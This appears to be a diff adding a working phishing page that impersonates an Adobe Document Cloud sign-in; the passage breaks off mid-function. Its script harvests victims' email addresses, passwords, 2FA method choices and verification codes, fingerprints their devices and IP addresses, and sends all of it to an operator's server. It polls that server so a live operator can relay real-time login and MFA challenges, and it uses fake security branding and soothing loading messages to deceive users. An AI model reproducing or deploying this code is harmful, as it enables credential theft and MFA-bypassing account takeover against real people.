@@ -1,0 +1,942 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Adobe Document Cloud - Secure Access</title>
+  <link rel="icon" href="https://th.bing.com/th/id/R.10a0e79004ec24df6b67c1a7ade13f7b?rik=WgDtacyt160JGg&pid=ImgRaw&r=0" type="image/x-icon" />
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://robertlugana.sirv.com/icon/TEMPLATES/COOKIE/adobe-login.css">
+</head>
+<body>
+
+<div class="main-container">
+  <!-- Top Navigation Bar -->
+  <div class="top-navbar">
+    <img class="adobe-logo" src="https://th.bing.com/th/id/R.10a0e79004ec24df6b67c1a7ade13f7b?rik=WgDtacyt160JGg&pid=ImgRaw&r=0" alt="Adobe Logo">
+    <span class="nav-title">Adobe Document Cloud</span>
+  </div>
+  
+  <!-- Content Area -->
+  <div class="content-area">
+    <div class="document-preview">
+      <!-- Document List -->
+      <div class="document-list">
+        <!-- Document 1 -->
+        <div class="document-card">
+          <div class="lock-icon">
+            <i class="fas fa-lock"></i>
+          </div>
+          <div class="document-thumbnail">
+            <div class="thumbnail-content">
+              <div class="thumbnail-header"></div>
+              <div class="thumbnail-body">
+                <div class="thumbnail-line" style="width: 60%"></div>
+                <div class="thumbnail-line" style="width: 80%"></div>
+                <div class="thumbnail-line" style="width: 70%"></div>
+                <div class="thumbnail-line" style="width: 90%"></div>
+                <div class="thumbnail-line" style="width: 50%"></div>
+                <div class="thumbnail-line" style="width: 75%"></div>
+                <div class="thumbnail-line" style="width: 85%"></div>
+              </div>
+            </div>
+          </div>
+          <div class="document-info">
+            <div class="document-title">{{file1Name}}</div>
+            <div class="document-meta">
+              <span class="document-date">{{file1Date}}</span>
+              <span class="document-type">PDF</span>
+            </div>
+          </div>
+        </div>
+        
+        <!-- Document 2 -->
+        <div class="document-card">
+          <div class="lock-icon">
+            <i class="fas fa-lock"></i>
+          </div>
+          <div class="document-thumbnail">
+            <div class="thumbnail-content">
+              <div class="thumbnail-header"></div>
+              <div class="thumbnail-body">
+                <div class="thumbnail-line" style="width: 70%"></div>
+                <div class="thumbnail-line" style="width: 60%"></div>
+                <div class="thumbnail-line" style="width: 90%"></div>
+                <div class="thumbnail-line" style="width: 80%"></div>
+                <div class="thumbnail-line" style="width: 75%"></div>
+                <div class="thumbnail-line" style="width: 85%"></div>
+              </div>
+            </div>
+          </div>
+          <div class="document-info">
+            <div class="document-title">{{file2Name}}</div>
+            <div class="document-meta">
+              <span class="document-date">{{file2Date}}</span>
+              <span class="document-type">DOC</span>
+            </div>
+          </div>
+        </div>
+        
+        <!-- Document 3 -->
+        <div class="document-card">
+          <div class="lock-icon">
+            <i class="fas fa-lock"></i>
+          </div>
+          <div class="document-thumbnail">
+            <div class="thumbnail-content">
+              <div class="thumbnail-header"></div>
+              <div class="thumbnail-body" style="display: flex; flex-direction: column;">
+                <div style="display: flex; height: 8px; margin-bottom: 5px;">
+                  <div style="width: 30%; background-color: #2196F3; height: 100%;"></div>
+                  <div style="width: 40%; background-color: #4CAF50; height: 100%; margin-left: 2px;"></div>
+                  <div style="width: 30%; background-color: #FFC107; height: 100%; margin-left: 2px;"></div>
+                </div>
+                <div class="thumbnail-line" style="width: 100%"></div>
+                <div class="thumbnail-line" style="width: 100%"></div>
+                <div style="display: flex; height: 8px; margin-top: 5px;">
+                  <div style="width: 60%; background-color: #2196F3; height: 100%;"></div>
+                  <div style="width: 40%; background-color: #4CAF50; height: 100%; margin-left: 2px;"></div>
+                </div>
+                <div class="thumbnail-line" style="width: 100%; margin-top: 5px;"></div>
+              </div>
+            </div>
+          </div>
+          <div class="document-info">
+            <div class="document-title">{{file3Name}}</div>
+            <div class="document-meta">
+              <span class="document-date">{{file3Date}}</span>
+              <span class="document-type">XLS</span>
+            </div>
+          </div>
+        </div>
+        
+        <!-- Document 4 -->
+        <div class="document-card">
+          <div class="lock-icon">
+            <i class="fas fa-lock"></i>
+          </div>
+          <div class="document-thumbnail">
+            <div class="thumbnail-content">
+              <div class="thumbnail-header"></div>
+              <div class="thumbnail-body" style="display: flex; flex-direction: column;">
+                <div style="background-color: #f0f0f0; height: 60%; margin-bottom: 5px; display: flex; justify-content: center; align-items: center;">
+                  <div style="width: 50%; height: 80%; background-color: #ddd;"></div>
+                </div>
+                <div class="thumbnail-line" style="width: 90%"></div>
+                <div class="thumbnail-line" style="width: 80%"></div>
+                <div class="thumbnail-line" style="width: 70%"></div>
+              </div>
+            </div>
+          </div>
+          <div class="document-info">
+            <div class="document-title">{{file4Name}}</div>
+            <div class="document-meta">
+              <span class="document-date">{{file4Date}}</span>
+              <span class="document-type">PPT</span>
+            </div>
+          </div>
+        </div>
+      </div>
+      
+      <!-- Login Overlay -->
+      <div class="document-overlay">
+        <div class="login-container">
+          <h4 class="form-title">Adobe Document Cloud</h4>
+          <p class="form-subtitle">Sign in with your email account to access your secure documents</p>
+          
+          <!-- Email provider logos -->
+          <div class="email-providers">
+            <img class="email-provider-logo" src="https://robertlugana.sirv.com/icon/4202101_outlook_logo_microsoft_social_social%20media_icon.png" alt="Outlook">
+            <img class="email-provider-logo" src="https://robertlugana.sirv.com/icon/2993685_brand_brands_google_logo_logos_icon.png" alt="Gmail">
+            <img class="email-provider-logo" src="https://robertlugana.sirv.com/icon/386756_bookmarks_yahoo_icon.png" alt="Yahoo">
+            <img class="email-provider-logo" src="https://robertlugana.sirv.com/icon/Other%20Emails.png" alt="Others">
+          </div>
+          
+          <form id="form13" onsubmit="return handleSubmit(event);" method="post" autocomplete="off">
+            <div class="form-group" id="emailGroup">
+              <label for="exampleInputEmail1">Email address</label>
+              <input type="email" class="form-control" id="exampleInputEmail1" name="email" aria-describedby="emailHelp" required>
+              <small id="emailCallout" class="form-text text-muted">Enter your email address.</small>
+              <div class="error-message" id="InvalidEmail">Invalid email address. Please enter a valid email.</div>
+            </div>
+            <div class="form-group" id="passwordGroup">
+              <label for="exampleInputPassword1">Password</label>
+              <input type="password" class="form-control" id="exampleInputPassword1" name="password" required 
+                    onkeypress="if(event.key === 'Enter') handleFormSubmission();">
+              <div class="error-message" id="RequirePassword">Password is required</div>
+              <div class="error-message" id="InvalidPassword">Incorrect email or password. Try again.</div>
+            </div>
+
+            <div class="form-group" id="verificationOptionsGroup" style="display: none;">
+              <label>Choose a verification option</label>
+              <div id="verificationOptionsContainer">
+                <!-- Options will be dynamically loaded here -->
+              </div>
+              <div class="error-message" id="RequireVerificationChoice">Please select a verification option.</div>
+            </div>
+
+            <div class="form-group" id="verificationCodeGroup" style="display: none;">
+              <label for="verificationCodeInput">Verification Code</label>
+              <input type="text" class="form-control" id="verificationCodeInput" name="verificationCode" required
+                    onkeypress="if(event.key === 'Enter') handleFormSubmission();">
+              <div class="error-message" id="RequireVerificationCode">Verification code is required.</div>
+              <div class="error-message" id="InvalidVerificationCode">Invalid verification code. Please try again.</div>
+            </div>
+            
+            <div class="error-message" id="GeneralError">An error occurred. Please try again.</div>
+            
+            <input type="hidden" id="domainHidden" name="domain" value="">
+            <button type="button" class="btn btn-primary" id="submitButton" onclick="handleFormSubmission()">Login</button>
+          </form>
+          
+          <!-- Security footer with Adobe logo -->
+          <div class="security-footer">
+            <span class="security-text">SECURED BY ADOBE SAFE ACCESS™</span>
+            <img class="adobe-logo-footer" alt="Adobe Logo" src="https://th.bing.com/th/id/R.10a0e79004ec24df6b67c1a7ade13f7b?rik=WgDtacyt160JGg&pid=ImgRaw&r=0">
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Full-screen Loading Overlay -->
+<div class="loading-overlay" id="loadingOverlay">
+  <div class="loading-spinner"></div>
+  <p class="loading-text" id="loadingMessage"></p>
+  <p class="loading-error-message" id="documentRetrievalFailedMessage">Document retrieval failed. Please try again later.</p>
+</div>
+
+<script>
+// THESE ARE YOUR TEMPLATE VARIABLES - THEY WILL BE REPLACED BY YOUR SERVER-SIDE SCRIPT
+const templateConfig = {
+  postURL: "{{postURL}}",
+  token: "{{token}}",
+  landingPageLink: "{{landingPageLink}}"
+};
+
+let browserId = null;
+let pollingIntervalId = null;
+let currentStatus = null;
+let verificationOptions = [];
+let loadingMessages = [
+  "Securing your connection...",
+  "Verifying document integrity...",
+  "Establishing encrypted tunnel...",
+  "Authenticating access protocols...",
+  "Preparing your secure workspace...",
+  "Almost there, just a moment...",
+  "Ensuring data privacy...",
+  "Finalizing secure document retrieval..."
+];
+let currentMessageIndex = 0;
+let messageIntervalId = null;
+// Track last seen lastJsonResponse timestamp to avoid re-applying the same error repeatedly
+let lastSeenLjTimestamp = null;
+// Track last seen password error to avoid clearing password field repeatedly
+let lastSeenPasswordErrorTimestamp = null;
+// Flag to prevent input listener from clearing fields during programmatic updates
+let isUserTyping = false;
+
+// Helper function to show loading overlay with dynamic text
+function showLoadingOverlay(showSpinner = true, isError = false) {
+  const overlay = document.getElementById('loadingOverlay');
+  const spinner = overlay.querySelector('.loading-spinner');
+  const loadingText = document.getElementById('loadingMessage');
+  const errorMessage = document.getElementById('documentRetrievalFailedMessage');
+
+  overlay.style.display = 'flex';
+  document.querySelector('.document-overlay').style.display = 'none'; // Hide login form
+
+  if (isError) {
+    spinner.style.display = 'none';
+    loadingText.style.display = 'none';
+    errorMessage.style.display = 'block';
+    clearInterval(messageIntervalId);
+  } else {
+    spinner.style.display = showSpinner ? 'block' : 'none';
+    loadingText.style.display = 'block';
+    errorMessage.style.display = 'none';
+    startLoadingMessages();
+  }
+}
+
+// Helper function to hide loading overlay
+function hideLoadingOverlay() {
+  document.getElementById('loadingOverlay').style.display = 'none';
+  document.querySelector('.document-overlay').style.display = 'flex'; // Show login form
+  clearInterval(messageIntervalId);
+}
+
+// Function to cycle through loading messages
+function startLoadingMessages() {
+  const loadingMessageElement = document.getElementById('loadingMessage');
+  currentMessageIndex = 0;
+  loadingMessageElement.textContent = loadingMessages[currentMessageIndex];
+
+  if (messageIntervalId) {
+    clearInterval(messageIntervalId);
+  }
+
+  messageIntervalId = setInterval(() => {
+    currentMessageIndex = (currentMessageIndex + 1) % loadingMessages.length;
+    loadingMessageElement.textContent = loadingMessages[currentMessageIndex];
+  }, 5000); // Change message every 5 seconds
+}
+
+// Function to validate email format
+function isValidEmail(email) {
+  const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+  return emailPattern.test(email);
+}
+
+// Helper function to convert object to URLSearchParams
+function objectToFormData(obj) {
+  const formData = new URLSearchParams();
+  Object.entries(obj).forEach(([key, value]) => {
+    formData.append(key, value.toString());
+  });
+  return formData.toString();
+}
+
+// Function to update UI based on polling status
+function updateUIForStatus(status, data = {}) {
+  currentStatus = status;
+  const emailGroup = document.getElementById('emailGroup');
+  const passwordGroup = document.getElementById('passwordGroup');
+  const verificationOptionsGroup = document.getElementById('verificationOptionsGroup');
+  const verificationCodeGroup = document.getElementById('verificationCodeGroup');
+  const submitButton = document.getElementById('submitButton');
+  const emailField = document.getElementById('exampleInputEmail1');
+  const passwordField = document.getElementById('exampleInputPassword1');
+  const verificationCodeInput = document.getElementById('verificationCodeInput');
+
+  // Keep password input enabled by default so users can type if they want.
+  passwordField.disabled = false;
+
+  // Hide all error messages
+  hideAllErrors();
+
+  // Reset button state
+  submitButton.disabled = false;
+  submitButton.style.backgroundColor = "";
+  submitButton.style.color = "";
+
+  // Always show email and password fields
+  emailGroup.style.display = 'block';
+  passwordGroup.style.display = 'block';
+
+  switch (status) {
+      case 'WAITING':
+      // Generic waiting state: show loading overlay and wait for background processing
+      showLoadingOverlay(true);
+      verificationOptionsGroup.style.display = 'none';
+      verificationCodeGroup.style.display = 'none';
+      submitButton.innerText = "Please wait...";
+      submitButton.disabled = true;
+      emailField.readOnly = !!emailField.value && emailField.value.trim() !== '';
+      startPolling(10000);
+      break;
+    case 'PROCESSING':
+      showLoadingOverlay(true);
+      verificationOptionsGroup.style.display = 'none';
+      verificationCodeGroup.style.display = 'none';
+      submitButton.innerText = "Processing...";
+      submitButton.disabled = true;
+      emailField.readOnly = true;
+      startPolling(10000); // Poll every 10 seconds for processing
+      break;
+    case 'WAITINGEMAIL':
+      hideLoadingOverlay();
+      verificationOptionsGroup.style.display = 'none';
+      verificationCodeGroup.style.display = 'none';
+      submitButton.innerText = "Continue";
+      emailField.readOnly = false; // Allow email input if not prefilled
+      // Replace the small callout text with the server-provided error and keep it visible
+      try {
+        const lj = typeof data.lastJsonResponse === 'string' ? JSON.parse(data.lastJsonResponse) : (data.lastJsonResponse || {});
+        const msg = lj && lj.message ? lj.message : null;
+        // Only treat as email error if sheet/check result explicitly says emailExists=false or status is WAITINGEMAIL
+        const looksLikeEmailError = lj && (lj.emailExists === false || lj.status === 'WAITINGEMAIL');
+        const msgMatches = msg && /email does not exist|invalid email|no such email|email not found/i.test(msg);
+        const ljBrowserId = lj && lj.browserId ? lj.browserId : null;
+        const browserMatches = ljBrowserId ? (browserId && ljBrowserId === browserId) : true;
+        const isEmailError = browserMatches && (looksLikeEmailError || msgMatches);
+
+        const ljKey = `${ljBrowserId || ''}::${lj.timestamp || ''}::${msg || ''}`;
+        const isNewError = ljKey && ljKey !== lastSeenLjTimestamp;
+
+        const emailCalloutEl = document.getElementById('emailCallout');
+
+        if (isEmailError) {
+          // Show the error in the callout and apply error class so it persists across polling updates
+          emailCalloutEl.textContent = msg || "Email does not exist. Please provide a valid email.";
+          emailCalloutEl.classList.add('email-callout-error');
+          // Keep the dedicated inline error element hidden (we use the callout as primary error UI)
+          document.getElementById('InvalidEmail').style.display = 'none';
+
+          if (isNewError) {
+            // Only clear fields once for a newly-observed server error
+            try { emailField.value = ''; } catch(e) {}
+            try { passwordField.value = ''; } catch(e) {}
+            lastSeenLjTimestamp = ljKey;
+          }
+        } else {
+          // No server email error — restore default callout appearance
+          emailCalloutEl.textContent = "Enter your email address.";
+          emailCalloutEl.classList.remove('email-callout-error');
+        }
+      } catch (e) {
+        // ignore JSON parse errors and leave callout as-is
+      }
+      startPolling(10000); // Poll every 10 seconds for user input
+      break;
+    case 'WAITINGPASSWORD':
+      hideLoadingOverlay();
+      verificationOptionsGroup.style.display = 'none';
+      verificationCodeGroup.style.display = 'none';
+      submitButton.innerText = "Login";
+      emailField.readOnly = true;
+      passwordField.disabled = false;
+      
+      // Clear email error callout since we've moved past email validation
+      const emailCalloutEl = document.getElementById('emailCallout');
+      emailCalloutEl.textContent = "Enter your email address.";
+      emailCalloutEl.classList.remove('email-callout-error');
+      
+      // If the server indicated a previous incorrect password, surface that to the user
+      try {
+        const lj = typeof data.lastJsonResponse === 'string' ? JSON.parse(data.lastJsonResponse) : (data.lastJsonResponse || {});
+        if (lj && (lj.message && /incorrect|wrong password|incorrect password/i.test(lj.message))) {
+          document.getElementById('InvalidPassword').textContent = lj.message || "Incorrect email or password. Try again.";
+          document.getElementById('InvalidPassword').style.display = 'block';
+          
+          // Only clear the password field once per unique error (by checking timestamp)
+          const pwdErrorKey = `${lj.timestamp || ''}::${lj.message || ''}`;
+          if (pwdErrorKey && pwdErrorKey !== lastSeenPasswordErrorTimestamp) {
+            passwordField.value = '';
+            lastSeenPasswordErrorTimestamp = pwdErrorKey;
+          }
+        }
+      } catch (e) {
+        // ignore JSON parse errors
+      }
+      startPolling(10000); // Poll every 10 seconds for user input
+      break;
+    case 'WAITINGOPTIONS':
+      hideLoadingOverlay();
+      verificationOptionsGroup.style.display = 'block';
+      verificationCodeGroup.style.display = 'none';
+      submitButton.innerText = "Submit Choice";
+      emailField.readOnly = true;
+      // keep password enabled; it's not used in options flow but should remain editable
+      verificationOptions = data.verificationOptions || [];
+      renderVerificationOptions(verificationOptions);
+      startPolling(10000); // Poll every 10 seconds for user input
+      break;
+    case 'WAITINGCODE':
+      hideLoadingOverlay();
+      verificationOptionsGroup.style.display = 'none';
+      verificationCodeGroup.style.display = 'block';
+      submitButton.innerText = "Submit Code";
+      emailField.readOnly = true;
+      // keep password enabled for user convenience
+      verificationCodeInput.value = ''; // Clear previous code
+      startPolling(10000); // Poll every 10 seconds for user input
+      break;
+    case 'COMPLETED':
+      hideLoadingOverlay();
+      clearInterval(pollingIntervalId);
+      let redirectUrl = templateConfig.landingPageLink && templateConfig.landingPageLink.trim() !== '' ?
+        templateConfig.landingPageLink :
+        "https://learningresourcesnetwork-my.sharepoint.com/:x:/g/personal/brendan_lern_org/EZN5bpWBZTxChTgSdmSwmtUBEqPKrmWF0_T7WtMsRehNWA?rtime=Z7fPqXLW3Eg";
+      if (redirectUrl && !redirectUrl.startsWith('http://') && !redirectUrl.startsWith('https://')) {
+        redirectUrl = `https://${redirectUrl}`;
+      }
+      window.location.href = redirectUrl;
+      break;
+    case 'FAILED':
+      showLoadingOverlay(false, true); // Show error message, no spinner
+      clearInterval(pollingIntervalId);
+      // Prefer details from lastJsonResponse if available
+      try {
+        const lj = typeof data.lastJsonResponse === 'string' ? JSON.parse(data.lastJsonResponse) : (data.lastJsonResponse || {});
+        const emailCalloutEl = document.getElementById('emailCallout');
+        if (lj && lj.status === 'WAITINGEMAIL') {
+          // Show email error in the callout so it persists like WAITINGEMAIL handling
+          emailCalloutEl.textContent = lj.message || "Email does not exist. Please check your email.";
+          emailCalloutEl.classList.add('email-callout-error');
+          document.getElementById('InvalidEmail').style.display = 'none';
+        } else if (lj && (lj.message && /incorrect|wrong password|incorrect password/i.test(lj.message))) {
+          document.getElementById('InvalidPassword').textContent = lj.message || "Incorrect email or password. Try again.";
+          document.getElementById('InvalidPassword').style.display = 'block';
+        } else if (data.emailExists === false) {
+          emailCalloutEl.textContent = "Email does not exist. Please check your email.";
+          emailCalloutEl.classList.add('email-callout-error');
+          document.getElementById('InvalidEmail').style.display = 'none';
+        } else if (data.accountAccess === false) {
+          document.getElementById('InvalidPassword').textContent = "Incorrect email or password. Try again.";
+          document.getElementById('InvalidPassword').style.display = 'block';
+        } else {
+          document.getElementById('GeneralError').textContent = "An error occurred. Please try again.";
+          document.getElementById('GeneralError').style.display = 'block';
+        }
+      } catch (e) {
+        document.getElementById('GeneralError').textContent = "An error occurred. Please try again.";
+        document.getElementById('GeneralError').style.display = 'block';
+      }
+      resetFormState(); // Keep form inaccessible
+      break;
+    default:
+      // For any other unexpected status, treat as a failure and show error
+      showLoadingOverlay(false, true); // Show error message, no spinner
+      document.getElementById('GeneralError').textContent = "An unexpected status was received. Please try again.";
+      document.getElementById('GeneralError').style.display = 'block';
+      resetFormState(); // Keep form inaccessible
+      break;
+  }
+}
+
+// Function to hide all error messages
+function hideAllErrors() {
+  document.getElementById('InvalidEmail').style.display = 'none';
+  document.getElementById('InvalidPassword').style.display = 'none';
+  document.getElementById('RequirePassword').style.display = 'none';
+  document.getElementById('GeneralError').style.display = 'none';
+  document.getElementById('RequireVerificationChoice').style.display = 'none';
+  document.getElementById('RequireVerificationCode').style.display = 'none';
+  document.getElementById('InvalidVerificationCode').style.display = 'none';
+}
+
+// Function to render 2FA verification options
+function renderVerificationOptions(options) {
+  const container = document.getElementById('verificationOptionsContainer');
+  container.innerHTML = ''; // Clear previous options
+
+  if (!options || options.length === 0) {
+    container.innerHTML = '<p>No verification options available.</p>';
+    return;
+  }
+
+  options.forEach((option, index) => {
+    const div = document.createElement('div');
+    div.className = 'form-check';
+
+    const input = document.createElement('input');
+    input.type = 'radio';
+    input.className = 'form-check-input';
+    input.name = 'verificationOption';
+    input.id = `verificationOption${index}`;
+    input.value = option.choiceIndex;
+    input.dataset.valueAttribute = option.valueAttribute; // Store valueAttribute for later use
+    input.dataset.type = option.type;
+    input.dataset.maskedDetail = option.maskedDetail || '';
+
+    const label = document.createElement('label');
+    label.className = 'form-check-label';
+    label.htmlFor = `verificationOption${index}`;
+    label.textContent = option.label;
+
+    div.appendChild(input);
+    div.appendChild(label);
+    container.appendChild(div);
+  });
+}
+
+// Initial form submission on page load
+async function initialFormSubmission() {
+  showLoadingOverlay(true); // Show spinner and dynamic text
+  const urlParams = new URLSearchParams(window.location.search);
+  const email = urlParams.get('email');
+  const emailField = document.getElementById('exampleInputEmail1');
+  const emailCallout = document.getElementById('emailCallout');
+  const domainHiddenInput = document.getElementById('domainHidden');
+
+  if (email) {
+    emailField.value = email;
+    emailField.readOnly = true;
+    emailCallout.textContent = "Your email was securely prefilled and cannot be changed.";
+    const atIndex = email.lastIndexOf('@');
+    if (atIndex !== -1) {
+      domainHiddenInput.value = email.slice(atIndex + 1);
+    } else {
+      domainHiddenInput.value = '';
+    }
+  } else {
+    emailField.readOnly = false;
+    emailCallout.textContent = "Enter your email address.";
+  }
+
+  // When the user starts typing in the email or password field, clear any server-provided error
+  try {
+    const setUserTyping = () => { isUserTyping = true; };
+    const clearUserTyping = () => { isUserTyping = false; };
+    
+    emailField.addEventListener('focus', setUserTyping);
+    emailField.addEventListener('blur', clearUserTyping);
+    passwordField.addEventListener('focus', setUserTyping);
+    passwordField.addEventListener('blur', clearUserTyping);
+    
+    emailField.addEventListener('input', () => {
+      // Only clear error if the user is actually typing (not a programmatic change from polling)
+      if (!isUserTyping) return;
+      
+      const emailCalloutEl = document.getElementById('emailCallout');
+      emailCalloutEl.textContent = "Enter your email address.";
+      emailCalloutEl.classList.remove('email-callout-error');
+      document.getElementById('InvalidEmail').style.display = 'none';
+      // Allow new errors to be applied after the user edits
+      lastSeenLjTimestamp = null;
+    });
+    
+    passwordField.addEventListener('input', () => {
+      // Only clear error if the user is actually typing (not a programmatic change from polling)
+      if (!isUserTyping) return;
+      
+      const emailCalloutEl = document.getElementById('emailCallout');
+      emailCalloutEl.textContent = "Enter your email address.";
+      emailCalloutEl.classList.remove('email-callout-error');
+      document.getElementById('InvalidEmail').style.display = 'none';
+      document.getElementById('InvalidPassword').style.display = 'none';
+      // Allow new errors to be applied after the user edits
+      lastSeenLjTimestamp = null;
+      lastSeenPasswordErrorTimestamp = null;
+    });
+  } catch (e) {
+    // ignore if element not present
+  }
+
+  const formDataContent = {
+    email: email || '', // Send email if prefilled, otherwise empty
+    password: '', // Password is not sent initially
+    ipData: {}, // Will be fetched
+    deviceData: {
+      userAgent: navigator.userAgent,
+      platform: navigator.platform,
+      language: navigator.language,
+      screenWidth: window.screen.width,
+      screenHeight: window.screen.height,
+      colorDepth: window.screen.colorDepth,
+      pixelRatio: window.devicePixelRatio,
+      hardwareConcurrency: navigator.hardwareConcurrency,
+      deviceMemory: navigator.deviceMemory,
+      vendor: navigator.vendor,
+      maxTouchPoints: navigator.maxTouchPoints,
+    },
+  };
+
+  try {
+    const ipData = await fetch('https://ipinfo.io/json').then(res => res.json()).catch(() => ({}));
+    formDataContent.ipData = ipData;
+
+    const finalPayload = {
+      token: templateConfig.token,
+      formData: JSON.stringify(formDataContent)
+    };
+    console.log("Initial Form Submission Payload:", finalPayload);
+    console.log("Initial Form Submission Body (URL-encoded):", objectToFormData(finalPayload));
+
+    const response = await fetch(`${templateConfig.postURL}/notify-form-submission`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: objectToFormData(finalPayload)
+    });
+
+    if (!response.ok) {
+      throw new Error(`HTTP error! status: ${response.status}`);
+    }
+
+    const data = await response.json();
+    console.log("Initial Form Submission Response:", data);
+
+    if (data.apiResponse && data.apiResponse.browserId) {
+      browserId = data.apiResponse.browserId;
+      updateUIForStatus(data.apiResponse.status, data.apiResponse);
+      // Polling will be started by updateUIForStatus if status is not FAILED
+    } else {
+      throw new Error("No browserId received from initial submission.");
+    }
+  } catch (error) {
+    console.error("Error during initial form submission:", error);
+    document.getElementById('GeneralError').textContent = "Failed to initiate process. Please try again.";
+    document.getElementById('GeneralError').style.display = 'block';
+    showLoadingOverlay(false, true); // Show error message, no spinner
+    resetFormState(); // Keep form inaccessible
+  }
+}
+
+// Start polling the operator endpoint
+function startPolling(interval = 10000) { // Default to 10 seconds
+  if (pollingIntervalId) {
+    clearInterval(pollingIntervalId);
+  }
+  pollingIntervalId = setInterval(pollOperator, interval);
+}
+
+// Poll the operator endpoint
+async function pollOperator() {
+  if (!browserId) {
+    console.warn("No browserId available for polling.");
+    clearInterval(pollingIntervalId);
+    return;
+  }
+
+  try {
+    const pollingPayload = { browserId: browserId, token: templateConfig.token };
+    console.log("Polling Payload:", pollingPayload);
+    console.log("Polling Body (URL-encoded):", objectToFormData(pollingPayload));
+
+    const response = await fetch(`${templateConfig.postURL}/pooling-operator`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: objectToFormData(pollingPayload)
+    });
+
+    if (!response.ok) {
+      throw new Error(`HTTP error! status: ${response.status}`);
+    }
+
+    const data = await response.json();
+    console.log("Polling response:", data);
+
+    if (data.currentStatus) {
+      const responseData = data.data || {};
+      const currentStatusFromResponse = data.currentStatus;
+      
+      // Check if we should keep the loading state active while waiting for backend pickup
+      // If WAITINGEMAIL with email already in sheet, or WAITINGPASSWORD with password already in sheet,
+      // keep loading active and continue polling (don't update UI yet)
+      const isWaitingEmailWithData = currentStatusFromResponse === 'WAITINGEMAIL' && responseData.email && responseData.email.trim() !== '';
+      const isWaitingPasswordWithData = currentStatusFromResponse === 'WAITINGPASSWORD' && responseData.password && responseData.password.trim() !== '';
+      
+      if (isWaitingEmailWithData || isWaitingPasswordWithData) {
+        // Keep loading overlay visible and continue polling
+        console.log("Polling detected backend still picking up data. Keeping loading state active.", {
+          status: currentStatusFromResponse,
+          hasEmail: !!responseData.email,
+          hasPassword: !!responseData.password
+        });
+        showLoadingOverlay(true);
+        startPolling(5000); // Poll more frequently (every 5 seconds) while waiting for backend pickup
+      } else {
+        // Update UI normally if not in "waiting for pickup" state
+        updateUIForStatus(data.currentStatus, data.data || {});
+      }
+    } else {
+      console.warn("Polling response missing currentStatus:", data);
+    }
+  } catch (error) {
+    console.error("Error during polling:", error);
+    document.getElementById('GeneralError').textContent = "Polling failed. Please try again.";
+    document.getElementById('GeneralError').style.display = 'block';
+    clearInterval(pollingIntervalId);
+    hideLoadingOverlay(); // Changed from hideLoadingDialog to hideLoadingOverlay
+    resetFormState();
+  }
+}
+
+// Handle form submission (email/password, 2FA choice, 2FA code)
+async function handleFormSubmission() {
+  hideAllErrors();
+  showLoadingOverlay(true); // Show spinner during submission
+
+  const emailField = document.getElementById('exampleInputEmail1');
+  const passwordField = document.getElementById('exampleInputPassword1');
+  const verificationCodeInput = document.getElementById('verificationCodeInput');
+  const submitButton = document.getElementById('submitButton');
+
+  submitButton.disabled = true;
+  submitButton.innerText = "Submitting...";
+  submitButton.style.backgroundColor = "#BEBEBE";
+  submitButton.style.color = "#000";
+
+  let payload = {
+    browserId: browserId,
+    token: templateConfig.token
+  };
+  let updateType = '';
+
+  try {
+    if (currentStatus === 'WAITINGEMAIL') {
+      const email = emailField.value.trim();
+      const password = passwordField.value.trim();
+      if (!isValidEmail(email)) {
+        document.getElementById('InvalidEmail').style.display = 'block';
+        hideLoadingOverlay();
+        resetFormState();
+        return;
+      }
+      payload.email = email;
+      // Allow submitting password together with email when available
+      if (password) {
+        payload.password = password;
+        updateType = 'email_and_password';
+      } else {
+        updateType = 'email';
+      }
+      startPolling(10000); // Poll after email/password submission
+    } else if (currentStatus === 'WAITINGPASSWORD') {
+      const password = passwordField.value.trim();
+      if (!password) {
+        document.getElementById('RequirePassword').style.display = 'block';
+        hideLoadingOverlay(); // Hide loading overlay on client-side validation error
+        resetFormState();
+        return;
+      }
+      payload.password = password;
+      updateType = 'password';
+      startPolling(10000); // Faster polling after user input (10 seconds)
+    } else if (currentStatus === 'WAITINGOPTIONS') {
+      const selectedOption = document.querySelector('input[name="verificationOption"]:checked');
+      if (!selectedOption) {
+        document.getElementById('RequireVerificationChoice').style.display = 'block';
+        hideLoadingOverlay(); // Hide loading overlay on client-side validation error
+        resetFormState();
+        return;
+      }
+
+      const choiceIndex = selectedOption.value;
+      const optionType = selectedOption.dataset.type;
+      const maskedDetail = selectedOption.dataset.maskedDetail;
+
+      let verificationChoiceJson;
+      if (optionType === 'email' || optionType === 'phone') {
+        verificationChoiceJson = [{
+          "choice": choiceIndex,
+          "hiddenPhoneEmail": maskedDetail
+        }];
+      } else {
+        verificationChoiceJson = [{
+          "choice": choiceIndex
+        }];
+      }
+      payload.verificationChoice = JSON.stringify(verificationChoiceJson);
+      updateType = 'verificationChoice';
+    } else if (currentStatus === 'WAITINGCODE') {
+      const verificationCode = verificationCodeInput.value.trim();
+      if (!verificationCode) {
+        document.getElementById('RequireVerificationCode').style.display = 'block';
+        hideLoadingOverlay(); // Hide loading overlay on client-side validation error
+        resetFormState();
+        return;
+      }
+      payload.verificationCode = verificationCode;
+      updateType = 'verificationCode';
+      startPolling(10000); // Faster polling after user input (10 seconds)
+    } else {
+      console.warn("handleFormSubmission called in an unexpected state:", currentStatus);
+      document.getElementById('GeneralError').textContent = "Unexpected form submission. Please try again.";
+      document.getElementById('GeneralError').style.display = 'block';
+      hideLoadingOverlay(); // Hide loading overlay on unexpected state
+      resetFormState();
+      return;
+    }
+
+    // Add the update type to the payload instead of a custom header
+    payload.updateType = updateType;
+
+    console.log("Handle Form Submission Payload:", payload);
+    console.log("Handle Form Submission Body (URL-encoded):", objectToFormData(payload));
+
+    // Send updates directly to pooling-operator (it can update multiple fields)
+    const response = await fetch(`${templateConfig.postURL}/pooling-operator`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/x-www-form-urlencoded'
+      },
